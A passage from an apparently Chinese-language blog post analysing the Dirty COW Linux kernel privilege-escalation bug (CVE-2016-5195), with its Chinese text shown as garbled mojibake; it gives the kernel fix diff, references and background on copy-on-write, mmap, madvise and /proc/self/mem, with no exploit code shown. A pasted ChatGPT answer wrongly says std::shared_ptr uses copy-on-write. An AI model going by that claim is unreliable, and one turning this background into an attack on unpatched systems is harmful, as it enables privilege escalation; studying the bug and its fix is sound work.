<figure class="highlight diff"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/include/linux/mm.h b/include/linux/mm.h</span></span><br><span class="line"><span class="comment">index e9caec6a51e97..ed85879f47f5f 100644</span></span><br><span class="line"><span class="comment">--- a/include/linux/mm.h</span></span><br><span class="line"><span class="comment">+++ b/include/linux/mm.h</span></span><br><span class="line"><span class="meta">@@ -2232,6 +2232,7 @@</span> static inline struct page *follow_page(struct vm_area_struct *vma,</span><br><span class="line"> #define FOLL_TRIED	0x800	/* a retry, previous pass started an IO */</span><br><span class="line"> #define FOLL_MLOCK	0x1000	/* lock present pages */</span><br><span class="line"> #define FOLL_REMOTE	0x2000	/* we are working on non-current tsk/mm */</span><br><span class="line"><span class="addition">+#define FOLL_COW	0x4000	/* internal GUP flag */</span></span><br><span class="line"> </span><br><span class="line"> typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,</span><br><span class="line"> 			void *data);</span><br><span class="line"><span class="comment">diff --git a/mm/gup.c b/mm/gup.c</span></span><br><span class="line"><span class="comment">index 96b2b2fd0fbd1..22cc22e7432f6 100644</span></span><br><span class="line"><span class="comment">--- a/mm/gup.c</span></span><br><span class="line"><span class="comment">+++ b/mm/gup.c</span></span><br><span class="line"><span class="meta">@@ -60,6 +60,16 @@</span> static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,</span><br><span class="line"> 	return -EEXIST;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+/*</span></span><br><span class="line"><span class="addition">+ * FOLL_FORCE can write to even unwritable pte&#x27;s, but only</span></span><br><span class="line"><span class="addition">+ * after we&#x27;ve gone through a COW cycle and they are dirty.</span></span><br><span class="line"><span class="addition">+ */</span></span><br><span class="line"><span class="addition">+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	return pte_write(pte) ||</span></span><br><span class="line"><span class="addition">+		((flags &amp; FOLL_FORCE) &amp;&amp; (flags &amp; FOLL_COW) &amp;&amp; pte_dirty(pte));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> static struct page *follow_page_pte(struct vm_area_struct *vma,</span><br><span class="line"> 		unsigned long address, pmd_t *pmd, unsigned int flags)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="meta">@@ -95,7 +105,7 @@</span> retry:</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	if ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))</span><br><span class="line"> 		goto no_page;</span><br><span class="line"><span class="deletion">-	if ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;</span></span><br><span class="line"><span class="addition">+	if ((flags &amp; FOLL_WRITE) &amp;&amp; !can_follow_write_pte(pte, flags)) &#123;</span></span><br><span class="line"> 		pte_unmap_unlock(ptep, ptl);</span><br><span class="line"> 		return NULL;</span><br><span class="line"> 	&#125;</span><br><span class="line"><span class="meta">@@ -412,7 +422,7 @@</span> static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,</span><br><span class="line"> 	 * reCOWed by userspace write).</span><br><span class="line"> 	 */</span><br><span class="line"> 	if ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line"><span class="deletion">-		*flags &amp;= ~FOLL_WRITE;</span></span><br><span class="line"><span class="addition">+	        *flags |= FOLL_COW;</span></span><br><span class="line"> 	return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></div></figure>
<p>patchä¸­ï¼Œå¢åŠ äº†ä¸€ä¸ª<code>FOLL_COW</code>çš„å±æ€§å’Œä¸€äº›æ£€æŸ¥ã€‚å½“ç¬¬äºŒæ¬¡å› ä¸º â€œé¡µè¡¨æƒé™å’Œè®¿é—®æƒé™ä¸åŒ¹é…â€ è¿›å…¥<code>faultin_page()</code>å¤„ç†æ—¶ï¼Œä¸å†æ¸…é™¤<code>FOLL_WRITE</code>å±æ€§ï¼Œè€Œæ˜¯ç»™flagsåŠ ä¸Šä¸€ä¸ª<code>FOLL_COW</code>çš„å±æ€§ã€‚è¿™æ ·ç¬¬ä¸‰æ¬¡è¿›å…¥<code>follow_page_mask()</code>æ—¶ä»ç„¶å¸¦ç€<code>FOLL_WRITE</code>ï¼Œé¿å…äº†æ¡ä»¶ç«äº‰å¼•èµ·çš„å†™page cacheã€‚</p>

        <h1 id="å‚è€ƒèµ„æ–™"   >
          <a href="#å‚è€ƒèµ„æ–™" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1>
      <ul>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://atum.li/2016/10/25/dirtycow/" >CVE-2016-5195 DirtyCow:Linuxå†…æ ¸ææƒæ¼æ´åˆ†æ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf" >å¥”è·‘å§linuxå†…æ ¸2.18å°èŠ‚</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579444153" >pin memoryä¸get_user_pages()å‡½æ•°</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38537730/article/details/104252794" >é¡µè¡¨ç®¡ç†-linuxé¡µç›®å½•é¡¹è·å–ç›¸å…³å‡½æ•°åˆ†æ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼šå®é™…ä¸Š64ä½linuxä¸­è¿˜æœ‰ä¸ªPUDï¼Œå¤šäº†ä¸€å±‚</p>
</li>
</ul>

        <h1 id="çŸ¥è¯†ç‚¹"   >
          <a href="#çŸ¥è¯†ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1>
      
        <h2 id="copy-on-writeæœºåˆ¶"   >
          <a href="#copy-on-writeæœºåˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-on-writeæœºåˆ¶" class="headerlink" title="copy-on-writeæœºåˆ¶"></a>copy-on-writeæœºåˆ¶</h2>
      <p>å…ˆçœ‹ä¸€ä¸‹wikiä¸Šå¯¹<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Copy-on-write" >Copy-on-write</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>çš„è§£é‡Šï¼š</p>
<p>Copy-on-write(COW)æ˜¯è®¡ç®—æœºç¼–ç¨‹ä¸­ä¸€ç§èµ„æºç®¡ç†æŠ€æœ¯ï¼Œå®ƒæé«˜äº†â€œå¯æ›´æ”¹èµ„æºâ€çš„å¤åˆ¶æ•ˆç‡ã€‚å¦‚æœä¸€ä¸ªèµ„æºéœ€è¦è¢«å¤åˆ¶ï¼Œä½†æš‚æ—¶ä¸ä¼šè¢«æ›´æ”¹ï¼Œé‚£ä¹ˆå°±æ²¡å¿…è¦åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºï¼Œè€Œæ˜¯è®©â€œå¤åˆ¶å“â€å’Œâ€åŸä»¶â€å…±äº«åŒä¸€ä¸ªèµ„æºã€‚ä½†å¦‚æœåç»­å¯¹è¯¥èµ„æºçš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œæ›´æ”¹ï¼ˆå¦‚å†™æ“ä½œï¼‰æ—¶ï¼Œå°±å¿…é¡»åˆ›å»ºä¸€ä¸ªæ–°èµ„æºï¼ˆå¤åˆ¶ä¸€ä»½ï¼‰ã€‚ä¹Ÿå°±æ˜¯copy-on-writeï¼ˆå†™æ—¶æ‹·è´ï¼‰åå­—çš„æ„ä¹‰ï¼Œåœ¨è¿›è¡Œå†™æ“ä½œæ—¶æ‰çœŸæ­£æ‰§è¡Œå¤åˆ¶çš„æ“ä½œã€‚</p>
<p>åœ¨è™šæ‹Ÿå†…å­˜ç®¡ç†ä¸­ï¼Œcopy-on-writeåœ¨forkç³»ç»Ÿè°ƒç”¨çš„å®ç°ä¸­æœ‰æ‰€ä½“ç°ï¼Œç”¨äºçˆ¶å­è¿›ç¨‹é—´è™šæ‹Ÿå†…å­˜çš„å…±äº«ã€‚é€šå¸¸ï¼Œåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹æ—¶ï¼Œçˆ¶å­è¿›ç¨‹çš„å†…å­˜ç©ºé—´æœ‰å¤§é‡ç›¸åŒçš„å†…å®¹ï¼Œå¦‚æœä¸ºå­è¿›ç¨‹åˆ›å»ºä¸€ä¸ªè·Ÿçˆ¶è¿›ç¨‹åŒæ ·å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œæ˜¯éå¸¸æµªè´¹çš„è¡Œä¸ºï¼Œè¿™æ—¶copy-on-writeæœºåˆ¶å°±èƒ½å¾ˆå¥½åœ°å‘æŒ¥ä½œç”¨ã€‚</p>
<p>copy-on-writeæœºåˆ¶çš„å®ç°å¯ä»¥å¾ˆç®€å•ï¼Œåœ¨é¡µè¡¨ä¸Šæ ‡è®°æŸä¸ªå†…å­˜é¡µé¢ä¸ºåªè¯»ï¼Œå¹¶è®°å½•å½“å‰ç‰©ç†é¡µé¢çš„å¼•ç”¨æ•°ï¼ˆåœ¨struct pageä¸­ï¼‰ã€‚å½“å†…æ ¸ç›‘æ§åˆ°æœ‰å¯¹è¿™ä¸ªé¡µé¢å†™çš„è¯·æ±‚æ—¶ï¼Œå°±æ–°ç”³è¯·ä¸€ä¸ªç‰©ç†é¡µé¢ï¼Œå°†åŸæ•°æ®æ‹·è´è¿‡æ¥ï¼ˆå¯¹äºå¼•ç”¨è®¡æ•°ä¸º1çš„æƒ…å†µï¼Œæ— éœ€ç”³è¯·æ–°é¡µé¢ï¼‰ã€‚æ›´æ–°é¡µè¡¨æŒ‡å‘æ–°ç”³è¯·çš„ç‰©ç†é¡µé¢ï¼Œå¯¹åŸç‰©ç†é¡µé¢çš„å¼•ç”¨è®¡æ•°å‡1ï¼Œç„¶åæ‰§è¡Œå†™æ“ä½œã€‚</p>
<p>å¦å¤–ï¼Œåœ¨å†…å­˜åˆ†é…ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨copy-on-writeæœºåˆ¶ã€‚åœ¨ç³»ç»Ÿä¸­ä¿ç•™ä¸€ä¸ªå†…å®¹å…¨ä¸º0çš„ç‰©ç†é¡µé¢ï¼Œå½“è¿›ç¨‹ç”³è¯·å†…å­˜æ—¶ï¼ŒæŠŠè¿™ä¸ªç‰©ç†é¡µé¢æ˜ å°„ç»™è¿›ç¨‹ï¼Œå¹¶å°†å…¶æ ‡è®°ä¸ºcopy-on-writeã€‚è¿™æ ·ï¼Œåªæœ‰å½“è¿›ç¨‹æœ‰å†™æ“ä½œæ—¶ï¼Œæ‰éœ€è¦ä¸ºå…¶åˆ†é…ç‰©ç†å†…å­˜ï¼Œè®©è¿›ç¨‹æ‹¥æœ‰çš„è™šæ‹Ÿå†…å­˜ç©ºé—´å¤§äºå®é™…çš„ç‰©ç†å†…å­˜ç©ºé—´ã€‚</p>
<p>å…³äºå®ƒçš„åº”ç”¨åœºæ™¯ï¼Œæˆ‘é—®äº†ä¸€ä¸‹chatgptï¼Œè§‰å¾—å®ƒå›ç­”å¾—æŒºå¥½çš„ï¼Œç›´æ¥è´´ä¸Šæ¥äº†ã€‚ï¼ˆæ„Ÿè§‰ä»¥åå†™åšå®¢éƒ½å¯ä»¥äº¤ç»™å®ƒäº†hhhhï¼‰</p>
<p>Copy-On-Writeï¼ˆCOWï¼‰æœºåˆ¶åœ¨æ“ä½œç³»ç»Ÿå’Œç¼–ç¨‹è¯­è¨€ä¸­æœ‰å¤šç§åº”ç”¨åœºæ™¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„åº”ç”¨åœºæ™¯å’Œæ–¹æ³•ï¼š</p>
<ol>
<li>è¿›ç¨‹å¤åˆ¶ï¼šåœ¨Linuxä¸­ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨fork()ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œå­è¿›ç¨‹ä¼šå…±äº«çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚ä½¿ç”¨COWæœºåˆ¶å¯ä»¥é¿å…ä¸å¿…è¦çš„å†…å­˜å¤åˆ¶ï¼Œä»è€Œæé«˜è¿›ç¨‹åˆ›å»ºçš„æ•ˆç‡å’Œæ€§èƒ½ã€‚</li>
<li>æ–‡ä»¶ç³»ç»Ÿï¼šåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼ŒCOWæŠ€æœ¯å¯ä»¥ç”¨äºå®ç°å†™æ—¶å¤åˆ¶ï¼ˆCopy-On-Writeï¼‰çš„å¿«ç…§ã€‚åœ¨å†™æ—¶å¤åˆ¶å¿«ç…§ä¸­ï¼Œå½“æ–‡ä»¶è¢«ä¿®æ”¹æ—¶ï¼Œä»…ä¼šå¤åˆ¶å‘ç”Ÿå˜åŒ–çš„æ•°æ®å—ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–‡ä»¶ã€‚è¿™å¯ä»¥èŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œå¹¶æé«˜å¿«ç…§çš„åˆ›å»ºå’Œæ¢å¤é€Ÿåº¦ã€‚</li>
<li>å†…å­˜åˆ†é…ï¼šåœ¨ç¼–ç¨‹è¯­è¨€ä¸­ï¼ŒCOWæœºåˆ¶å¯ä»¥ç”¨äºå®ç°å…±äº«å†…å­˜ã€‚ä¾‹å¦‚ï¼Œåœ¨C++ä¸­ï¼Œstd::shared_ptrç±»ä½¿ç”¨COWæŠ€æœ¯æ¥å®ç°å¤šä¸ªæŒ‡é’ˆå…±äº«åŒä¸€ä¸ªå¯¹è±¡çš„å†…å­˜ã€‚å½“ä¸€ä¸ªæŒ‡é’ˆå°è¯•ä¿®æ”¹å…±äº«å†…å­˜æ—¶ï¼ŒCOWæœºåˆ¶ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ‹·è´ï¼Œä»¥é¿å…å¯¹å…¶ä»–æŒ‡é’ˆçš„å½±å“ã€‚</li>
<li>æ•°æ®åº“ï¼šåœ¨æ•°æ®åº“ä¸­ï¼ŒCOWæŠ€æœ¯å¯ä»¥ç”¨äºå®ç°å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰ã€‚åœ¨MVCCä¸­ï¼Œæ¯ä¸ªäº‹åŠ¡å¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„ä¸€ä¸ªå¿«ç…§ã€‚å½“äº‹åŠ¡ä¿®æ”¹æ•°æ®æ—¶ï¼ŒCOWæœºåˆ¶ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ï¼Œä»¥é¿å…å¯¹å…¶ä»–äº‹åŠ¡çš„å½±å“ã€‚</li>
</ol>
<p>è¿™äº›åªæ˜¯COWæœºåˆ¶çš„ä¸€äº›å¸¸è§åº”ç”¨åœºæ™¯å’Œæ–¹æ³•ï¼Œå®ƒè¿˜å¯ä»¥ç”¨äºå…¶ä»–è®¸å¤šé¢†åŸŸï¼Œä¾‹å¦‚è™šæ‹Ÿå†…å­˜ã€ç½‘ç»œåè®®æ ˆç­‰ã€‚</p>

        <h2 id="mmap"   >
          <a href="#mmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2>
      <p>mmapæ˜¯ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆåœ¨libcä¸­å°è£…æˆäº†mmapå‡½æ•°ï¼‰ï¼Œå®ƒå¯ä»¥å°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‚å½“æˆ‘ä»¬éœ€è¦å¯¹æ–‡ä»¶æˆ–è®¾å¤‡è¿›è¡Œè¯»å†™æ“ä½œæ—¶ï¼Œé€šå¸¸éœ€è¦å°†å®ƒä»¬è¯»å–åˆ°å†…å­˜ä¸­ï¼Œç„¶åè¿›è¡Œæ“ä½œï¼Œæœ€åå†å†™å›åˆ°æ–‡ä»¶æˆ–è®¾å¤‡ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹éœ€è¦ä½¿ç”¨å¤§é‡çš„ç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ä¼ è¾“ï¼Œéå¸¸ç¹çå’Œè€—æ—¶ã€‚è€Œå°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œå¯ä»¥å°†æ–‡ä»¶æˆ–è®¾å¤‡çš„æ•°æ®ç›´æ¥æ˜ å°„åˆ°è¿›ç¨‹çš„å†…å­˜ä¸­ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥åœ¨å†…å­˜ä¸­è¿›è¡Œè¯»å†™æ“ä½œï¼Œå¤§å¤§æé«˜äº†è¯»å†™æ•ˆç‡ã€‚</p>
<p>mmapç³»ç»Ÿè°ƒç”¨è¢«å°è£…æˆäº†ä¸€ä¸ªlibcçš„å‡½æ•°ï¼Œå‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></div></figure>
<ul>
<li>void *addrï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸåœ¨è¿›ç¨‹ä¸­çš„èµ·å§‹åœ°å€ï¼Œé€šå¸¸ä¼ å…¥NULLï¼Œè®©å†…æ ¸è‡ªåŠ¨åˆ†é…ã€‚</li>
<li>size_t lengthï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸçš„å¤§å°ã€‚</li>
<li>int protï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸçš„è®¿é—®æƒé™ï¼Œå¸¸ç”¨çš„æœ‰å¯è¯»<code>PROT_READ</code>ã€å¯å†™<code>PROT_WRITE</code>ã€å¯æ‰§è¡Œ<code>PROT_EXEC</code>ç­‰ã€‚</li>
<li>int flagsï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸçš„æ˜ å°„æ–¹å¼ï¼Œæ¯”å¦‚ç§æœ‰æ˜ å°„<code>MAP_PRIVATE</code>ã€å…±äº«æ˜ å°„<code>MAP_SHARED</code>ã€åŒ¿åæ˜ å°„<code>MAP_ANONYMOUS</code>ã€å›ºå®šæ˜ å°„<code>MAP_FIXED</code>ç­‰ã€‚</li>
<li>int fdï¼šæŒ‡å®šéœ€è¦æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœæŒ‡å®šæ˜ å°„æ–¹å¼æ˜¯åŒ¿åæ˜ å°„ï¼Œåˆ™ä¸º-1ã€‚</li>
<li>off_t offsetï¼šæŒ‡å®šä»æ–‡ä»¶æˆ–è®¾å¤‡çš„å“ªä¸ªä½ç½®å¼€å§‹æ˜ å°„æ•°æ®ã€‚</li>
</ul>
<p>mmapå‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘æ˜ å°„åŒºåŸŸçš„æŒ‡é’ˆï¼Œå¦‚æœæ˜ å°„å¤±è´¥ï¼Œåˆ™è¿”å›MAP_FAILEDã€‚</p>
<p>è¯¥æ¼æ´åˆ©ç”¨é‡ç‚¹éœ€è¦å…³æ³¨æ˜ å°„æ–¹å¼MAP_PRIVATEã€‚</p>
<blockquote>
<p>MAP_PRIVATEï¼šç§æœ‰æ˜ å°„ã€‚å°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ç§æœ‰çš„æ˜ å°„åŒºåŸŸã€‚è¿™æ ·ï¼Œè¿›ç¨‹å¯ä»¥åœ¨è¿™ä¸ªæ˜ å°„åŒºåŸŸä¸­è¿›è¡Œè¯»å†™æ“ä½œï¼Œè€Œä¸ä¼šå½±å“åŸå§‹æ–‡ä»¶æˆ–è®¾å¤‡ã€‚å½“è¿›ç¨‹å¯¹æ˜ å°„åŒºåŸŸè¿›è¡Œä¿®æ”¹æ—¶ï¼Œå†…æ ¸ä¼šå°†è¿™äº›ä¿®æ”¹å†™å…¥åˆ°ä¸€ä¸ªæ–°çš„ç§æœ‰é¡µé¢ä¸­ï¼Œè€Œä¸ä¼šå½±å“åŸå§‹æ–‡ä»¶æˆ–è®¾å¤‡ã€‚è¿™ä¸ªæ ‡å¿—å¿…é¡»ä¸PROT_READç»“åˆä½¿ç”¨ã€‚</p>
</blockquote>
<p>ç®€å•æ¥è¯´ï¼ŒMAP_PRIVATEæ ‡å¿—ä¼šå»ºç«‹ä¸€ä¸ªå†™å…¥æ—¶æ‹·è´ï¼ˆcopy-on-writeï¼‰çš„ç§æœ‰æ˜ å°„ï¼Œå†…å­˜åŒºåŸŸçš„å†™å…¥ä¸ä¼šå½±å“åˆ°åŸæ–‡ä»¶ã€‚</p>
<p>å°è¯•ç”¨ä¸åŒçš„openå±æ€§å’Œmmapå±æ€§æ¥æ“ä½œæµ‹è¯•æ–‡ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<div class="table-container"><table>
<thead>
<tr>
<th>open</th>
<th>mmap</th>
<th>result</th>
</tr>
</thead>
<tbody><tr>
<td>O_RDWR</td>
<td>PROT_READ|PROT_WRITE,MAP_PRIVATE</td>
<td>å†™æ“ä½œä¸ä¼šæŠ¥é”™ï¼Œä½†å†…å®¹æ— æ³•åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶</td>
</tr>
<tr>
<td>O_RDWR</td>
<td>PROT_READ|PROT_WRITE,MAP_SHARED</td>
<td>å†™çš„å†…å®¹å°†åŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶ä¸­</td>
</tr>
<tr>
<td>O_RDWR</td>
<td>PROT_READï¼ŒMAP_PRIVATE</td>
<td>å°è¯•å¾€æ˜ å°„åŒºå†™å…¥æ—¶ç¨‹åºå´©æºƒ</td>
</tr>
<tr>
<td>O_RDWR</td>
<td>PROT_READï¼ŒMAP_SHARED</td>
<td>å°è¯•å¾€æ˜ å°„åŒºå†™å…¥æ—¶ç¨‹åºå´©æºƒ</td>
</tr>
<tr>
<td>O_RDONLY</td>
<td>PROT_READ|PROT_WRITE,MAP_PRIVATE</td>
<td>å¯ä»¥æ˜ å°„æˆåŠŸï¼Œä½†å†™çš„å†…å®¹ä¸ä¼šåŒæ­¥åˆ°ç£ç›˜æ–‡ä»¶</td>
</tr>
<tr>
<td>O_RDONLY</td>
<td>PROT_READ|PROT_WRITE,MAP_SHARED</td>
<td>æ— æ³•æ˜ å°„æˆåŠŸï¼ŒmmapæŠ¥é”™Permission denied</td>
</tr>
</tbody></table></div>

        <h2 id="madvise"   >
          <a href="#madvise" class="heading-link"><i class="fas fa-link"></i></a><a href="#madvise" class="headerlink" title="madvise"></a>madvise</h2>
      <p>madviseï¼ˆmemory adviseï¼‰æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥ç”¨äºå‘å†…æ ¸æä¾›å…³äºè¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€äº›æç¤ºï¼Œä»¥å¸®åŠ©å†…æ ¸ä¼˜åŒ–å†…å­˜ä½¿ç”¨å’Œæ€§èƒ½ã€‚</p>
<p>madviseè¢«å°è£…æˆlibcå‡½æ•°ï¼Œå…¶åŸå‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">madvise</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> advice)</span></span>;</span><br></pre></td></tr></table></div></figure>
<p>å…¶ä¸­ï¼Œaddræ˜¯è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„èµ·å§‹åœ°å€ï¼Œlengthæ˜¯éœ€è¦æä¾›æç¤ºçš„å†…å­˜åŒºåŸŸçš„å¤§å°ï¼Œadviceæ˜¯æç¤ºç±»å‹ï¼Œå¸¸è§çš„æç¤ºç±»å‹æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>MADV_NORMALï¼šé»˜è®¤è¡Œä¸ºï¼Œä¸æä¾›ä»»ä½•æç¤ºã€‚</li>
<li>MADV_RANDOMï¼šè¯¥åŒºåŸŸå°†è¢«éšæœºè®¿é—®ï¼Œå»ºè®®å†…æ ¸é¢„è¯»å–ç›¸é‚»çš„é¡µã€‚</li>
<li>MADV_SEQUENTIALï¼šè¯¥åŒºåŸŸå°†è¢«é¡ºåºè®¿é—®ï¼Œå»ºè®®å†…æ ¸é¢„è¯»å–æ•´ä¸ªåŒºåŸŸã€‚</li>
<li>MADV_WILLNEEDï¼šè¯¥åŒºåŸŸå°†è¢«è®¿é—®ï¼Œå»ºè®®å†…æ ¸é¢„è¯»å–æ•´ä¸ªåŒºåŸŸã€‚</li>
<li>MADV_DONTNEEDï¼šè¯¥åŒºåŸŸä¸å†éœ€è¦ï¼Œå»ºè®®å†…æ ¸é‡Šæ”¾ç›¸åº”çš„ç‰©ç†å†…å­˜ï¼ˆé¡µè¡¨é¡¹å°†è¢«ç½®ç©ºï¼‰ã€‚</li>
</ul>

        <h2 id="proc-self-memæ–‡ä»¶"   >
          <a href="#proc-self-memæ–‡ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#proc-self-memæ–‡ä»¶" class="headerlink" title="/proc/self/memæ–‡ä»¶"></a>/proc/self/memæ–‡ä»¶</h2>
      <p><code>/proc/&lt;pid&gt;/</code>ç›®å½•ä¸‹æœ‰è®¸å¤šç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¦‚<code>/proc/self/maps</code>å¯ä»¥çœ‹åˆ°æŸ¥çœ‹è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´æ˜ å°„çš„æƒ…å†µï¼Œ<code>/proc/self/mem</code>å¯¹åº”å½“å‰è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆå¯ä»¥ç›´æ¥å¯¹è™šæ‹Ÿåœ°å€ç©ºé—´è¿›è¡Œè¯»å†™ï¼‰ã€‚</p>
<p>å¦‚ä¸‹æ‰€ç¤ºä»£ç ç‰‡æ®µï¼Œæœ€ç»ˆvalueçš„è¾“å‡ºç»“æœæ˜¯â€999â€ã€‚</p>
